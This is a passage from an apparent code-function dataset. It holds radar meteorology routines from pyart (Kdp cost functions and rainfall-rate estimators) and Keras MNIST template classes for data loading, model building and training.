    phi_far[is_unphysical] = phi_near[is_unphysical]
    if verbose:
        N = is_unphysical.sum()
        print(f'Rays with unphysical boundary conditions: {N}')
    return (phi_near, phi_far, range_near, range_far, idx_near, idx_far)"
ARM-DOE/pyart,_cost_maesaka,"def _cost_maesaka(x, psidp_o, bcs, dhv, dr, Cobs, Clpf, finite_order, fill_value, proc, debug=False, verbose=False):
    """"""
    Compute the value of the cost functional similar to equations (12)-(15) in
    Maesaka et al. (2012).

    Parameters
    ----------
    x : ndarray
        Analysis vector containing control variable k.
    psidp_o : ndarray
        Total differential phase measurements.
    bcs : array_like
        The near and far range gate propagation differential phase boundary
        conditions.
    dhv : ndarray
        Backscatter differential phase.
    dr : float
        Range resolution in meters.
    Cobs : ndarray
        The differential phase measurement constraint weights. The weight
        should vanish where no differential phase measurements are available.
    Clpf : float
        The low-pass filter (radial smoothness) constraint weight as in
        equation (15) of Maesaka et al. (2012).
    finite_order : 'low' or 'high'
        The finite difference accuracy to use when computing derivatives.
    fill_value : float
        Value indicating missing or bad data in radar field data.
    proc : int
        The number of parallel threads (CPUs) to use.
    debug : bool, optional
        True to print debugging information, False to suppress.
    verbose : bool, optional
        True to print progress information, False to suppress.

    Returns
    -------
    J : float
        Value of total cost functional.

    """"""
    (nr, ng) = psidp_o.shape
    k = x.reshape(nr, ng)
    (phi_near, phi_far) = bcs
    phi_fa = np.zeros_like(k, subok=False)
    phi_fa[:, 1:] = np.cumsum(k[:, :-1] ** 2, axis=1)
    phi_ra = np.zeros_like(k, subok=False)
    phi_ra[:, :-1] = np.cumsum(k[:, :0:-1] ** 2, axis=1)[:, ::-1]
    phi_fo = psidp_o - dhv - phi_near[:, np.newaxis].repeat(ng, axis=1)
    phi_ro = phi_far[:, np.newaxis].repeat(ng, axis=1) - psidp_o + dhv
    Jof = 0.5 * np.sum(Cobs * (phi_fa - phi_fo) ** 2)
    Jor = 0.5 * np.sum(Cobs * (phi_ra - phi_ro) ** 2)
    k = np.ascontiguousarray(k, dtype=np.float64)
    d2kdr2 = np.empty_like(k)
    _kdp_proc.lowpass_maesaka_term(k, dr, finite_order, d2kdr2)
    Jlpf = 0.5 * np.sum(Clpf * d2kdr2 ** 2)
    J = Jof + Jor + Jlpf
    if verbose:
        print(f'Forward direction observation cost : {Jof:1.3e}')
        print(f'Reverse direction observation cost : {Jor:1.3e}')
        print(f'Low-pass filter cost ............. : {Jlpf:1.3e}')
        print(f'Total cost ....................... : {J:1.3e}')
    return J"
ARM-DOE/pyart,_jac_maesaka,"def _jac_maesaka(x, psidp_o, bcs, dhv, dr, Cobs, Clpf, finite_order, fill_value, proc, debug=False, verbose=False):
    """"""
    Compute the Jacobian (gradient) of the cost functional similar to equations
    (16)-(18) in Maesaka et al. (2012).

    Parameters
    ----------
    x : ndarray
        Analysis vector containing control variable k.
    psidp_o : ndarray
        Total differential phase measurements.
    bcs : array_like
        The near and far range gate propagation differential phase boundary
        conditions.
    dhv : ndarray
        Backscatter differential phase.
    dr : float
        Range resolution in meters.
    Cobs : ndarray
        The differential phase measurement constraint weights. The weight
        should vanish where no differential phase measurements are available.
    Clpf : float
        The low-pass filter (radial smoothness) constraint weight as in
        equation (15) of Maesaka et al. (2012).
    finite_order : 'low' or 'high'
        The finite difference accuracy to use when computing derivatives.
    fill_value : float
        Value indicating missing or bad data in radar field data.
    proc : int
        The number of parallel threads (CPUs) to use.
    debug : bool, optional
        True to print debugging information, False to suppress.
    verbose : bool, optional
        True to print progress information, False to suppress.

    Returns
    -------
    jac : ndarray
        Jacobian of the cost functional.

    """"""
    (nr, ng) = psidp_o.shape
    k = x.reshape(nr, ng)
    (phi_near, phi_far) = bcs
    phi_fa = np.zeros_like(k, subok=False)
    phi_fa[:, 1:] = np.cumsum(k[:, :-1] ** 2, axis=1)
    phi_ra = np.zeros_like(k, subok=False)
    phi_ra[:, :-1] = np.cumsum(k[:, :0:-1] ** 2, axis=1)[:, ::-1]
    phi_fo = psidp_o - dhv - phi_near[:, np.newaxis].repeat(ng, axis=1)
    phi_ro = phi_far[:, np.newaxis].repeat(ng, axis=1) - psidp_o + dhv
    k = np.ascontiguousarray(k, dtype=np.float64)
    dJofdk = np.zeros_like(k, subok=False)
    dJofdk[:, :-1] = 2.0 * k[:, :-1] * np.cumsum((Cobs[:, 1:] * (phi_fa[:, 1:] - phi_fo[:, 1:]))[:, ::-1], axis=1)[:, ::-1]
    dJordk = np.zeros_like(k, subok=False)
    dJordk[:, 1:] = 2.0 * k[:, 1:] * np.cumsum(Cobs[:, :-1] * (phi_ra[:, :-1] - phi_ro[:, :-1]), axis=1)
    d2kdr2 = np.empty_like(k)
    _kdp_proc.lowpass_maesaka_term(k, dr, finite_order, d2kdr2)
    dJlpfdk = np.empty_like(d2kdr2)
    _kdp_proc.lowpass_maesaka_jac(d2kdr2, dr, Clpf, finite_order, dJlpfdk)
    dJdk = dJofdk + dJordk + dJlpfdk
    jac = dJdk.flatten()
    if verbose:
        mag = np.linalg.norm(jac, ord=None, axis=None)
        print(f'Vector norm of Jacobian: {mag:1.3e}')
    return jac"
ARM-DOE/pyart,_forward_reverse_phidp,"def _forward_reverse_phidp(k, bcs, verbose=False):
    """"""
    Compute the forward and reverse direction propagation differential phases
    from the control variable k and boundary conditions following equations (1)
    and (7) in Maesaka et al. (2012).

    Parameters
    ----------
    k : ndarray
        Control variable k of the Maesaka et al. (2012) method. The control
        variable k is proportional to the square root of specific differential
        phase.
    bcs : array_like
        The near and far range gate boundary conditions.
    verbose : bool, optional
        True to print relevant information, False to suppress.

    Returns
    -------
    phidp_f : ndarray
        Forward direction propagation differential phase.
    phidp_r : ndarray
        Reverse direction propagation differential phase.

    """"""
    (_, ng) = k.shape
    (phi_near, phi_far) = bcs
    phi_f = np.zeros_like(k, subok=False)
    phi_f[:, 1:] = np.cumsum(k[:, :-1] ** 2, axis=1)
    phidp_f = phi_f + phi_near[:, np.newaxis].repeat(ng, axis=1)
    phi_r = np.zeros_like(k, subok=False)
    phi_r[:, :-1] = np.cumsum(k[:, :0:-1] ** 2, axis=1)[:, ::-1]
    phidp_r = phi_far[:, np.newaxis].repeat(ng, axis=1) - phi_r
    if verbose:
        phidp_mbe = np.ma.mean(phidp_f - phidp_r)
        phidp_mae = np.ma.mean(np.abs(phidp_f - phidp_r))
        print(f'Forward-reverse PHIDP MBE: {phidp_mbe:.2f} deg')
        print(f'Forward-reverse PHIDP MAE: {phidp_mae:.2f} deg')
    return (phidp_f, phidp_r)"
ARM-DOE/pyart,_parse_range_resolution,"def _parse_range_resolution(radar, check_uniform=True, atol=1.0, verbose=False):
    """"""
    Parse the radar range gate resolution.

    Parameters
    ----------
    radar : Radar
        Radar containing range data.
    check_uniform : bool, optional
        True to check if all range gates are equally spaced, and if so return
        a scalar value for range resolution. If False, the resolution between
        each range gate is returned.
    atol : float, optional
        The absolute tolerance in meters allowed for discrepancies in range
        gate spacings. Only applicable when check_uniform is True. This
        parameter may be necessary to catch instances where range gate spacings
        differ by a few meters or so.
    verbose : bool, optional
        True to print the range gate resolution. Only valid if check_uniform is
        True.

    Returns
    -------
    dr : float or ndarray
        The radar range gate spacing in meters.

    """"""
    dr = np.diff(radar.range['data'], n=1)
    if check_uniform and np.allclose(np.diff(dr), 0.0, atol=atol):
        dr = dr[0]
        if verbose:
            print(f'Range resolution: {dr:.2f} m')
    else:
        raise ValueError('Radar gate spacing is not uniform')
    return dr"
ARM-DOE/pyart,est_rain_rate_zpoly,"def est_rain_rate_zpoly(radar, refl_field=None, rr_field=None):
    """"""
    Estimates rainfall rate from reflectivity using a polynomial Z-R relation
    developed at McGill University.

    Parameters
    ----------
    radar : Radar
        Radar object.
    refl_field : str, optional
        Name of the reflectivity field to use.
    rr_field : str, optional
        Name of the rainfall rate field.

    Returns
    -------
    rain : dict
        Field dictionary containing the rainfall rate.

    References
    ----------
    Doelling et al. Systematic variations of Z–R-relationships from drop size
    distributions measured in northern Germany during seven years. 1998. Atmos.
    Ocean. Technol, 21, 1545-1556.

    Joss et al. Operational Use of Radar for Precipitation Measurements
    in Switzerland. 1998. Vdf Hochschulverlag AG ETH Zurich: 134.

    """"""
    if refl_field is None:
        refl_field = get_field_name('reflectivity')
    if rr_field is None:
        rr_field = get_field_name('radar_estimated_rain_rate')
    radar.check_field_exists(refl_field)
    refl = radar.fields[refl_field]['data']
    refl2 = refl * refl
    refl3 = refl * refl2
    refl4 = refl * refl3
    rr_data = np.ma.power(10.0, -2.3 + 0.17 * refl - 0.0051 * refl2 + 9.8e-05 * refl3 - 6e-07 * refl4)
    rain = get_metadata(rr_field)
    rain['data'] = rr_data
    return rain"
ARM-DOE/pyart,est_rain_rate_z,"def est_rain_rate_z(radar, alpha=0.0376, beta=0.6112, refl_field=None, rr_field=None):
    """"""
    Estimates rainfall rate from reflectivity using a power law.

    Parameters
    ----------
    radar : Radar
        Radar object.
    alpha, beta : floats, optional
        Factor (alpha) and exponent (beta) of the power law.
    refl_field : str, optional
        Name of the reflectivity field to use.
    rr_field : str, optional
        Name of the rainfall rate field.

    Returns
    -------
    rain : dict
        Field dictionary containing the rainfall rate.

    Reference
    ---------
    Fabry, Frédéric. Radar Meterology. 2015. Ch 9. pg 148-165.
    https://doi.org/10.1017/CBO9781107707405

    """"""
    if refl_field is None:
        refl_field = get_field_name('reflectivity')
    if rr_field is None:
        rr_field = get_field_name('radar_estimated_rain_rate')
    radar.check_field_exists(refl_field)
    refl = radar.fields[refl_field]['data']
    rr_data = alpha * np.ma.power(np.ma.power(10.0, 0.1 * refl), beta)
    rain = get_metadata(rr_field)
    rain['data'] = rr_data
    return rain"
ARM-DOE/pyart,est_rain_rate_kdp,"def est_rain_rate_kdp(radar, alpha=None, beta=None, kdp_field=None, rr_field=None):
    """"""
    Estimates rainfall rate from kdp using alpha power law.

    Parameters
    ----------
    radar : Radar
        Radar object.
    alpha, beta : floats, optional
        Factor (alpha) and exponent (beta) of the power law. If not set the
        factors are going to be determined according to the radar frequency.
    kdp_field : str, optional
        Name of the specific differential phase field to use.
    rr_field : str, optional
        Name of the rainfall rate field.

    Returns
    -------
    rain : dict
        Field dictionary containing the rainfall rate.

    Reference
    ---------
    Figueras et al. Long-term monitoring of French polarimetric radar data
    quality and evaluation of several polarimetric quantitative precipitation
    estimators in ideal conditions for operational implementation at C-band.
    Quarterly Journal of the Royal Meteorological Society. 2012.
    https://doi.org/10.1002/qj.1934

    """"""
    if alpha is None or beta is None:
        if 'frequency' in radar.instrument_parameters:
            (alpha, beta) = _get_coeff_rkdp(radar.instrument_parameters['frequency']['data'][0])
        else:
            (alpha, beta) = _coeff_rkdp_table()['C']
            warn('Radar frequency unknown. Default coefficients for C band will be applied.')
    if kdp_field is None:
        kdp_field = get_field_name('specific_differential_phase')
    if rr_field is None:
        rr_field = get_field_name('radar_estimated_rain_rate')
    radar.check_field_exists(kdp_field)
    kdp = radar.fields[kdp_field]['data']
    kdp[kdp < 0] = 0.0
    rr_data = alpha * np.ma.power(kdp, beta)
    rain = get_metadata(rr_field)
    rain['data'] = rr_data
    return rain"
ARM-DOE/pyart,est_rain_rate_a,"def est_rain_rate_a(radar, alpha=None, beta=None, a_field=None, rr_field=None):
    """"""
    Estimates rainfall rate from specific attenuation using alpha power law.

    Parameters
    ----------
    radar : Radar
        Radar object.
    alpha, beta : floats, optional
        Factor (alpha) and exponent (beta) of the power law. If not set the
        factors are going to be determined according to the radar frequency.
    a_field : str, optional
        Name of the specific attenuation field to use.
    rr_field : str, optional
        Name of the rainfall rate field.

    Returns
    -------
    rain : dict
        Field dictionary containing the rainfall rate.

    References
    ----------
    Diederich M., Ryzhkov A., Simmer C., Zhang P. and Tromel S., 2015: Use of
    Specific Attenuation for Rainfall Measurement at X-Band Radar Wavelenghts.
    Part I: Radar Calibration and Partial Beam Blockage Estimation. Journal of
    Hydrometeorology, 16, 487-502.

    Ryzhkov A., Diederich M., Zhang P. and Simmer C., 2014: Potential
    Utilization of Specific Attenuation for Rainfall Estimation, Mitigation of
    Partial Beam Blockage, and Radar Networking. Journal of Atmospheric and
    Oceanic Technology, 31, 599-619.

    """"""
    if alpha is None or beta is None:
        if 'frequency' in radar.instrument_parameters:
            (alpha, beta) = _get_coeff_ra(radar.instrument_parameters['frequency']['data'][0])
        else:
            (alpha, beta) = _coeff_ra_table()['C']
            warn('Radar frequency unknown. Default coefficients for C band will be applied.')
    if a_field is None:
        a_field = get_field_name('specific_attenuation')
    if rr_field is None:
        rr_field = get_field_name('radar_estimated_rain_rate')
    radar.check_field_exists(a_field)
    att = radar.fields[a_field]['data']
    rr_data = alpha * np.ma.power(att, beta)
    rain = get_metadata(rr_field)
    rain['data'] = rr_data
    return rain"
ARM-DOE/pyart,est_rain_rate_zkdp,"def est_rain_rate_zkdp(radar, alphaz=0.0376, betaz=0.6112, alphakdp=None, betakdp=None, refl_field=None, kdp_field=None, rr_field=None, main_field=None, thresh=None, thresh_max=True):
    """"""
    Estimates rainfall rate from a blending of power law r-kdp and r-z
    relations.

    Parameters
    ----------
    radar : Radar
        Radar object.
    alphaz, betaz : floats, optional
        Factor (alpha) and exponent (beta) of the z-r power law.
    alphakdp, betakdp : floats, optional
        Factor (alpha) and exponent (beta) of the kdp-r power law.
        If not set the factors are going to be determined according
        to the radar frequency.
    refl_field : str, optional
        Name of the reflectivity field to use.
    kdp_field : str, optional
        Name of the specific differential phase field to use.
    rr_field : str, optional
        Name of the rainfall rate field.
    main_field : str, optional
        Name of the field that is going to act as main. Has to be
        either refl_field or kdp_field. Default is refl_field.
    thresh : float, optional
        Value of the threshold that determines when to use the secondary
        field.
    thresh_max : Bool, optional
        If true the main field is used up to the thresh value maximum.
        Otherwise the main field is not used below thresh value.

    Returns
    -------
    rain_main : dict
        Field dictionary containing the rainfall rate.

    """"""
    if refl_field is None:
        refl_field = get_field_name('reflectivity')
    if kdp_field is None:
        kdp_field = get_field_name('specific_differential_phase')
    if rr_field is None:
        rr_field = get_field_name('radar_estimated_rain_rate')
    rain_z = est_rain_rate_z(radar, alpha=alphaz, beta=betaz, refl_field=refl_field, rr_field=rr_field)
    rain_kdp = est_rain_rate_kdp(radar, alpha=alphakdp, beta=betakdp, kdp_field=kdp_field, rr_field=rr_field)
    if main_field == refl_field:
        rain_main = rain_z
        rain_secondary = rain_kdp
    elif main_field == kdp_field:
        rain_main = rain_kdp
        rain_secondary = rain_z
    elif main_field is None:
        main_field = refl_field
        rain_main = rain_z
        rain_secondary = rain_kdp
    else:
        main_field = refl_field
        rain_main = rain_z
        rain_secondary = rain_kdp
        thresh = 40.0
        thresh_max = True
        warn('Unknown main field. Using ' + refl_field + ' with threshold ' + str(thresh))
    if thresh_max:
        is_secondary = rain_main['data'] > thresh
    else:
        is_secondary = rain_main['data'] < thresh
    rain_main['data'][is_secondary] = rain_secondary['data'][is_secondary]
    return rain_main"
ARM-DOE/pyart,est_rain_rate_za,"def est_rain_rate_za(radar, alphaz=0.0376, betaz=0.6112, alphaa=None, betaa=None, refl_field=None, a_field=None, rr_field=None, main_field=None, thresh=None, thresh_max=False):
    """"""
    Estimates rainfall rate from a blending of power law r-alpha and r-z
    relations.

    Parameters
    ----------
    radar : Radar
        Radar object
    alphaz, betaz : floats, optional
        Factor (alpha) and exponent (beta) of the z-r power law.
    alphaa,betaa : floats, optional
        Factor (alpha) and exponent (beta) of the a-r power law. If not set
        the factors are going to be determined according to the radar frequency.
    refl_field : str, optional
        Name of the reflectivity field to use.
    a_field : str, optional
        Name of the specific attenuation field to use.
    rr_field : str, optional
        Name of the rainfall rate field.
    main_field : str, optional
        Name of the field that is going to act as main. Has to be
        either refl_field or kdp_field. Default is refl_field.
    thresh : float, optional
        Value of the threshold that determines when to use the secondary
        field.
    thresh_max : Bool, optional
        If true the main field is used up to the thresh value maximum.
        Otherwise the main field is not used below thresh value.

    Returns
    -------
    rain_main : dict
        Field dictionary containing the rainfall rate.

    """"""
    if refl_field is None:
        refl_field = get_field_name('reflectivity')
    if a_field is None:
        a_field = get_field_name('specific_attenuation')
    if rr_field is None:
        rr_field = get_field_name('radar_estimated_rain_rate')
    rain_z = est_rain_rate_z(radar, alpha=alphaz, beta=betaz, refl_field=refl_field, rr_field=rr_field)
    rain_a = est_rain_rate_a(radar, alpha=alphaa, beta=betaa, a_field=a_field, rr_field=rr_field)
    if main_field == refl_field:
        rain_main = rain_z
        rain_secondary = rain_a
    elif main_field == a_field:
        rain_main = rain_a
        rain_secondary = rain_z
    elif main_field is None:
        main_field = a_field
        rain_main = rain_a
        rain_secondary = rain_z
    else:
        main_field = a_field
        rain_main = rain_a
        rain_secondary = rain_z
        thresh = 0.04
        thresh_max = False
        warn('Unknown main field. Using ' + a_field + ' with threshold ' + str(thresh))
    if thresh_max:
        is_secondary = rain_main['data'] > thresh
    else:
        is_secondary = rain_main['data'] < thresh
    rain_main['data'][is_secondary] = rain_secondary['data'][is_secondary]
    return rain_main"
ARM-DOE/pyart,est_rain_rate_hydro,"def est_rain_rate_hydro(radar, alphazr=0.0376, betazr=0.6112, alphazs=0.1, betazs=0.5, alphaa=None, betaa=None, mp_factor=0.6, refl_field=None, a_field=None, hydro_field=None, rr_field=None, main_field=None, thresh=None, thresh_max=False):
    """"""
    Estimates rainfall rate using different relations between R and the
    polarimetric variables depending on the hydrometeor type.

    Parameters
    ----------
    radar : Radar
        Radar object.
    alphazr, betazr : floats, optional
        Factor (alpha) and exponent (beta) of the z-r power law for rain.
    alphazs, betazs : floats, optional
        Factor (alpha) and exponent (beta) of the z-s power law for snow.
    alphaa, betaa : floats, optional
        Factor (alpha) and exponent (beta) of the a-r power law.
        If not set the factors are going to be determined according
        to the radar frequency.
    mp_factor : float, optional
        Factor applied to z-r relation in the melting layer.
    refl_field : str, optional
        Name of the reflectivity field to use.
    a_field : str, optional
        Name of the specific attenuation field to use.
    hydro_field : str, optional
        Name of the hydrometeor classification field to use.
    rr_field : str, optional
        Name of the rainfall rate field.
    main_field : str, optional
        Name of the field that is going to act as main. Has to be
        either refl_field or kdp_field. Default is refl_field.
    thresh : float, optional
        Value of the threshold that determines when to use the secondary
        field.
    thresh_max : Bool, optional
        If true the main field is used up to the thresh value maximum.
        Otherwise the main field is not used below thresh value.

    Returns
    -------
    rain : dict
        Field dictionary containing the rainfall rate.

    """"""
    if refl_field is None:
        refl_field = get_field_name('reflectivity')
    if a_field is None:
        a_field = get_field_name('specific_attenuation')
    if hydro_field is None:
        hydro_field = get_field_name('radar_echo_classification')
    if rr_field is None:
        rr_field = get_field_name('radar_estimated_rain_rate')
    if hydro_field in radar.fields:
        hydroclass = radar.fields[hydro_field]['data']
    else:
        raise KeyError('Field not available: ' + hydro_field)
    is_ds = hydroclass == 1
    is_cr = hydroclass == 2
    is_lr = hydroclass == 3
    is_gr = hydroclass == 4
    is_rn = hydroclass == 5
    is_vi = hydroclass == 6
    is_ws = hydroclass == 7
    is_mh = hydroclass == 8
    is_ih = hydroclass == 9
    rain_z = est_rain_rate_z(radar, alpha=alphazr, beta=betazr, refl_field=refl_field, rr_field=rr_field)
    snow_z = est_rain_rate_z(radar, alpha=alphazs, beta=betazs, refl_field=refl_field, rr_field=rr_field)
    rain_a = est_rain_rate_a(radar, alpha=alphaa, beta=betaa, a_field=a_field, rr_field=rr_field)
    rr_data = np.ma.zeros(hydroclass.shape, dtype='float32')
    rr_data[:] = np.ma.masked
    rr_data.set_fill_value(get_fillvalue())
    rr_data[is_ds] = snow_z['data'][is_ds]
    rr_data[is_cr] = snow_z['data'][is_cr]
    rr_data[is_vi] = snow_z['data'][is_vi]
    rr_data[is_gr] = snow_z['data'][is_gr]
    rr_data[is_ih] = snow_z['data'][is_ih]
    if main_field == refl_field:
        rain_main = rain_z
        rain_secondary = rain_a
    elif main_field == a_field:
        rain_main = rain_a
        rain_secondary = rain_z
    elif main_field is None:
        main_field = a_field
        rain_main = rain_a
        rain_secondary = rain_z
    else:
        main_field = a_field
        rain_main = rain_a
        rain_secondary = rain_z
        thresh = 0.04
        thresh_max = False
        warn('Unknown main field. Using ' + a_field + ' with threshold ' + str(thresh))
    if thresh_max:
        is_secondary = rain_main['data'] > thresh
    else:
        is_secondary = rain_main['data'] < thresh
    rain_main['data'][is_secondary] = rain_secondary['data'][is_secondary]
    rr_data[is_lr] = rain_main['data'][is_lr]
    rr_data[is_rn] = rain_main['data'][is_rn]
    rr_data[is_ws] = mp_factor * rain_z['data'][is_ws]
    rr_data[is_mh] = mp_factor * rain_z['data'][is_mh]
    rain = get_metadata(rr_field)
    rain['data'] = rr_data
    return rain"
ARM-DOE/pyart,_get_coeff_rkdp,"def _get_coeff_rkdp(freq):
    """"""
    Get the R(kdp) power law coefficients for a particular frequency.

    Parameters
    ----------
    freq : float
        Radar frequency [Hz].

    Returns
    -------
    alpha, beta : floats
        The coefficient and exponent of the power law.

    """"""
    coeff_rkdp_dict = _coeff_rkdp_table()
    freq_band = get_freq_band(freq)
    if freq_band is not None and freq_band in coeff_rkdp_dict:
        return coeff_rkdp_dict[freq_band]
    if freq < 2000000000.0:
        freq_band_aux = 'S'
    elif freq > 12000000000.0:
        freq_band_aux = 'X'
    warn('Radar frequency out of range. ' + 'Coefficients only applied to S, C or X band. ' + freq_band_aux + ' band coefficients will be used.')
    return coeff_rkdp_dict[freq_band_aux]"
ARM-DOE/pyart,_coeff_rkdp_table,"def _coeff_rkdp_table():
    """"""
    Defines the R(kdp) power law coefficients for each frequency band.

    Returns
    -------
    coeff_rkdp_dict : dict
        A dictionary with the coefficients at each band.

    """"""
    coeff_rkdp_dict = dict()
    coeff_rkdp_dict.update({'S': (50.7, 0.85)})
    coeff_rkdp_dict.update({'C': (29.7, 0.85)})
    coeff_rkdp_dict.update({'X': (15.81, 0.7992)})
    return coeff_rkdp_dict"
ARM-DOE/pyart,_get_coeff_ra,"def _get_coeff_ra(freq):
    """"""
    Get the R(A) power law coefficients for a particular frequency.

    Parameters
    ----------
    freq : float
        Radar frequency [Hz].

    Returns
    -------
    alpha, beta : floats
        The coefficient and exponent of the power law.

    """"""
    coeff_ra_dict = _coeff_ra_table()
    freq_band = get_freq_band(freq)
    if freq_band is not None and freq_band in coeff_ra_dict:
        return coeff_ra_dict[freq_band]
    if freq < 2000000000.0:
        freq_band_aux = 'S'
    elif freq > 12000000000.0:
        freq_band_aux = 'X'
    warn('Radar frequency out of range. ' + 'Coefficients only applied to S, C or X band. ' + freq_band_aux + ' band coefficients will be used.')
    return coeff_ra_dict[freq_band_aux]"
ARM-DOE/pyart,_coeff_ra_table,"def _coeff_ra_table():
    """"""
    Defines the R(A) power law coefficients for each frequency band.

    Returns
    -------
    coeff_ra_dict : dict
        A dictionary with the coefficients at each band.

    """"""
    coeff_ra_dict = dict()
    coeff_ra_dict.update({'S': (3100.0, 1.03)})
    coeff_ra_dict.update({'C': (250.0, 0.91)})
    coeff_ra_dict.update({'X': (45.5, 0.83)})
    return coeff_ra_dict"
ARM-DOE/pyart,ZtoR,"def ZtoR(radar, ref_field='reflectivity', a=300, b=1.4, save_name='NWS_primary_prate'):
    """"""
    Convert reflectivity (dBZ) to precipitation rate (mm/hr)

    Author: Laura Tomkins

    Parameters
    ----------
    radar : Radar
        Radar object used.
    ref_field : str
        Reflectivity field name to use to look up reflectivity data. In the
        radar object. Default field name is 'reflectivity'. Units are expected
        to be dBZ.
    a : float
        a value (coefficient) in the Z-R relationship
    b: float
        b value (exponent) in the Z-R relationship

    Returns
    -------
    radar : Radar
        The radar object containing the precipitation rate field

    References
    ----------
    American Meteorological Society, 2022: ""Z-R relation"". Glossary of Meteorology,
    https://glossary.ametsoc.org/wiki/Z-r_relation

    """"""
    ref_data = radar.fields[ref_field]['data']
    ref_data = np.ma.masked_invalid(ref_data)
    ref_linear = 10 ** (ref_data / 10)
    precip_rate = (ref_linear / a) ** (1 / b)
    prate_dict = {'data': precip_rate, 'standard_name': save_name, 'long_name': f'{save_name} rescaled from linear reflectivity', 'units': 'mm/hr', 'valid_min': 0, 'valid_max': 10000}
    radar.add_field(save_name, prate_dict, replace_existing=True)
    return radar"
Ahmkel/Keras-Project-Template,main,"def main():
    try:
        args = get_args()
        config = process_config(args.config)
        create_dirs([config.callbacks.tensorboard_log_dir, config.callbacks.checkpoint_dir])
        print('Create the data generator.')
        data_loader = factory.create('data_loader.' + config.data_loader.name)(config)
        print('Create the model.')
        model = factory.create('models.' + config.model.name)(config)
        print('Create the trainer')
        trainer = factory.create('trainers.' + config.trainer.name)(model.model, data_loader.get_train_data(), config)
        print('Start training the model.')
        trainer.train()
    except Exception as e:
        print(e)
        sys.exit(1)"
Ahmkel/Keras-Project-Template,main,"def main():
    try:
        args = get_args()
        config = process_config(args.config)
    except:
        print('missing or invalid arguments')
        exit(0)
    create_dirs([config.callbacks.tensorboard_log_dir, config.callbacks.checkpoint_dir])
    print('Create the data generator.')
    data_loader = SimpleMnistDataLoader(config)
    print('Create the model.')
    model = SimpleMnistModel(config)
    print('Create the trainer')
    trainer = SimpleMnistModelTrainer(model.model, data_loader.get_train_data(), config)
    print('Start training the model.')
    trainer.train()"
Ahmkel/Keras-Project-Template,__init__,"def __init__(self, config):
    self.config = config"
Ahmkel/Keras-Project-Template,get_train_data,"def get_train_data(self):
    raise NotImplementedError"
Ahmkel/Keras-Project-Template,get_test_data,"def get_test_data(self):
    raise NotImplementedError"
Ahmkel/Keras-Project-Template,__init__,"def __init__(self, config):
    self.config = config
    self.model = None"
Ahmkel/Keras-Project-Template,save,"def save(self, checkpoint_path):
    if self.model is None:
        raise Exception('You have to build the model first.')
    print('Saving model...')
    self.model.save_weights(checkpoint_path)
    print('Model saved')"
Ahmkel/Keras-Project-Template,load,"def load(self, checkpoint_path):
    if self.model is None:
        raise Exception('You have to build the model first.')
    print('Loading model checkpoint {} ...\n'.format(checkpoint_path))
    self.model.load_weights(checkpoint_path)
    print('Model loaded')"
Ahmkel/Keras-Project-Template,build_model,"def build_model(self):
    raise NotImplementedError"
Ahmkel/Keras-Project-Template,__init__,"def __init__(self, model, data, config):
    self.model = model
    self.data = data
    self.config = config"
Ahmkel/Keras-Project-Template,train,"def train(self):
    raise NotImplementedError"
Ahmkel/Keras-Project-Template,__init__,"def __init__(self, config):
    super(ConvMnistDataLoader, self).__init__(config)
    ((self.X_train, self.y_train), (self.X_test, self.y_test)) = mnist.load_data()
    self.X_train = self.X_train.reshape((-1, 28, 28, 1))
    self.X_test = self.X_test.reshape((-1, 28, 28, 1))"
Ahmkel/Keras-Project-Template,get_train_data,"def get_train_data(self):
    return (self.X_train, self.y_train)"
Ahmkel/Keras-Project-Template,get_test_data,"def get_test_data(self):
    return (self.X_test, self.y_test)"
Ahmkel/Keras-Project-Template,__init__,"def __init__(self, config):
    super(SimpleMnistDataLoader, self).__init__(config)
    ((self.X_train, self.y_train), (self.X_test, self.y_test)) = mnist.load_data()
    self.X_train = self.X_train.reshape((-1, 28 * 28))
    self.X_test = self.X_test.reshape((-1, 28 * 28))"
Ahmkel/Keras-Project-Template,get_train_data,"def get_train_data(self):
    return (self.X_train, self.y_train)"
Ahmkel/Keras-Project-Template,get_test_data,"def get_test_data(self):
    return (self.X_test, self.y_test)"
Ahmkel/Keras-Project-Template,__init__,"def __init__(self, config):
    super(ConvMnistModel, self).__init__(config)
    self.build_model()"
Ahmkel/Keras-Project-Template,build_model,"def build_model(self):
    self.model = Sequential()
    self.model.add(Conv2D(32, kernel_size=(3, 3), activation='relu', input_shape=(28, 28, 1)))
    self.model.add(Conv2D(64, (3, 3), activation='relu'))
    self.model.add(MaxPooling2D(pool_size=(2, 2)))
    self.model.add(Dropout(0.25))
    self.model.add(Flatten())
    self.model.add(Dense(128, activation='relu'))
    self.model.add(Dropout(0.5))
    self.model.add(Dense(10, activation='softmax'))
    self.model.compile(loss='sparse_categorical_crossentropy', optimizer=self.config.model.optimizer, metrics=['accuracy'])"
Ahmkel/Keras-Project-Template,__init__,"def __init__(self, config):
    super(SimpleMnistModel, self).__init__(config)
    self.build_model()"
Ahmkel/Keras-Project-Template,build_model,"def build_model(self):
    self.model = Sequential()
    self.model.add(Dense(32, activation='relu', input_shape=(28 * 28,)))
    self.model.add(Dense(16, activation='relu'))
    self.model.add(Dense(10, activation='softmax'))
    self.model.compile(loss='sparse_categorical_crossentropy', optimizer=self.config.model.optimizer, metrics=['acc'])"
Ahmkel/Keras-Project-Template,__init__,"def __init__(self, model, data, config):
    super(SimpleMnistModelTrainer, self).__init__(model, data, config)
    self.callbacks = []
    self.loss = []
    self.acc = []
    self.val_loss = []
    self.val_acc = []
    self.init_callbacks()"
Ahmkel/Keras-Project-Template,init_callbacks,"def init_callbacks(self):
    self.callbacks.append(ModelCheckpoint(filepath=os.path.join(self.config.callbacks.checkpoint_dir, '%s-{epoch:02d}-{val_loss:.2f}.hdf5' % self.config.exp.name), monitor=self.config.callbacks.checkpoint_monitor, mode=self.config.callbacks.checkpoint_mode, save_best_only=self.config.callbacks.checkpoint_save_best_only, save_weights_only=self.config.callbacks.checkpoint_save_weights_only, verbose=self.config.callbacks.checkpoint_verbose))
    self.callbacks.append(TensorBoard(log_dir=self.config.callbacks.tensorboard_log_dir, write_graph=self.config.callbacks.tensorboard_write_graph))
    if hasattr(self.config, 'comet_api_key'):
        from comet_ml import Experiment
        experiment = Experiment(api_key=self.config.comet_api_key, project_name=self.config.exp_name)
        experiment.disable_mp()
        experiment.log_multiple_params(self.config)
        self.callbacks.append(experiment.get_keras_callback())"
Ahmkel/Keras-Project-Template,train,"def train(self):
    history = self.model.fit(self.data[0], self.data[1], epochs=self.config.trainer.num_epochs, verbose=self.config.trainer.verbose_training, batch_size=self.config.trainer.batch_size, validation_split=self.config.trainer.validation_split, callbacks=self.callbacks)
    self.loss.extend(history.history['loss'])
